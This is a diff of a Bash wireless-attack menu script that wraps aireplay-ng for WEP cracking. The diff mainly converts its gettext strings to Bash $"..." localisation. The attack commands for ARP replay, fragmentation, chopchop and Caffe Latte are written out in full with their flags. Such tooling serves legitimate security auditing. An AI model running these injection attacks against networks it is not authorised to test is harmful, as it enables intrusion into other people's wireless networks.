@@ -31,7 +31,7 @@ check_client(){
 }
 
 wep_attacks_menu(){
-	help_fifo "${mark}${red}Wep attacks${end}\n"\
+	help_fifo $"${mark}${red}Wep attacks${end}\n"\
 		"You're seeing this menu because the network you selected has WEP encryption\n"\
 		"Here follows some information about each attack\n"\
 		"${red}ARP Replay${end}\n" \
@@ -45,12 +45,12 @@ wep_attacks_menu(){
 
 
     while true; do $clear 
-	    mkmenu "Attacks using a client"\
-            "ARP replay"\
-            "Fragmentation attack"\
-            "Chopchop attack"\
-            "Caffe latte"\
-            "Return to main menu"
+	    mkmenu $"Attacks using a client"\
+            $"ARP replay"\
+            $"Fragmentation attack"\
+            $"Chopchop attack"\
+            $"Caffe latte"\
+            $"Return to main menu"
 
             case $choice in
                 1) check_client ;  wep_attacks arpreplay_interactive; break ;;
@@ -58,7 +58,7 @@ wep_attacks_menu(){
                 3) check_client ;  wep_attacks chopchop; break ;;
                 4) check_client ;  wep_attacks caffelate; break ;;
                 5) $clear; break ;;
-                *) echo -e "`gettext \"Unknown response. Try again\"`" ;;
+                *) error $"Unknown response, try again";;
             esac
     done
 }
@@ -75,16 +75,16 @@ wep_attacks(){
 }
 interactive_wep(){
     if [ "$INTERACTIVE" == 1 ]; then
-        read -p "`gettext 'Enter destination mac: (FF:FF:FF:FF:FF:FF)'`" INJMAC
+        read -p $"Enter destination mac: (FF:FF:FF:FF:FF:FF)" INJMAC
         if [ "$INJMAC" = "" ]; then INJMAC=$INJMAC_; fi
-        read -p "`gettext 'Set framecontrol word (hex): (0841) '`" FT
+        read -p $"Set framecontrol word (hex): (0841) " FT
         if [ "$FT" = "" ]; then FT=$FT_; fi
     else INJMAC=$INJMAC_; FT=$FT_; fi
 }
 
 
 wep_attacks_caffelate(){
-	execute  "Cafe Latte Attack on: $Host_SSID "\
+	execute  $"Cafe Latte Attack on: $Host_SSID "\
 	   	$AIREPLAY -6 -b $Host_MAC -h $FAKE_MAC -x \
 		$INJECTRATE -D $iwifi & 
 	auth_attacks_fake 
@@ -94,10 +94,10 @@ wep_attacks_arpreplay_interactive(){
 	FT_="0841"; INJMAC_="FF:FF:FF:FF:FF:FF"; interactive_wep;
 
     if [[ $directed == 1 ]]; then
-		execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC -h $Client_MAC -x $INJECTRATE 
+		execute $"Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC -h $Client_MAC -x $INJECTRATE 
 	else
 		auth_attacks_fake &
-		execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE 
+		execute $"Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE 
 	fi
 }
 
@@ -106,11 +106,11 @@ wep_attacks_fragmentation(){
     killall -9 airodump-ng aireplay-ng
     if [[ $directed != 1 ]]; then
 		auth_attacks_fake &
-        export wait_for_execute=1; execute "Fragmentation w/o client" $AIREPLAY -5 -b $Host_MAC -h\
+        export wait_for_execute=1; execute $"Fragmentation w/o client" $AIREPLAY -5 -b $Host_MAC -h\
             $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi 
 		wait_for_execute=0;
     else
-        wait_for_execute=1; execute "Fragmentation attack" $AIREPLAY -7 -b $Host_MAC -h $Client_MAC\
+        wait_for_execute=1; execute $"Fragmentation attack" $AIREPLAY -7 -b $Host_MAC -h $Client_MAC\
             -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi  
 		wait_for_execute=0;
     fi
@@ -123,12 +123,12 @@ wep_attacks_chopchop(){
 
 	[[ $directed != 1 ]] && {
 		auth_attacks_fake &
-		export wait_for_execute=1; execute "Chopchoping at $Host_SSID"\
+		export wait_for_execute=1; execute $"Chopchoping at $Host_SSID"\
 			$AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $iwifi  
 		export wait_for_execute=0;
 	} || {
 		export wait_for_execute=1; 
-		execute "Directed ChopChoping to $Client_MAC at $Host_SSID"\
+		execute $"Directed ChopChoping to $Client_MAC at $Host_SSID"\
 			$AIREPLAY  --chopchop -b $Host_MAC -h $Client_MAC $iwifi 
 		export wait_for_execute=0;
 	}
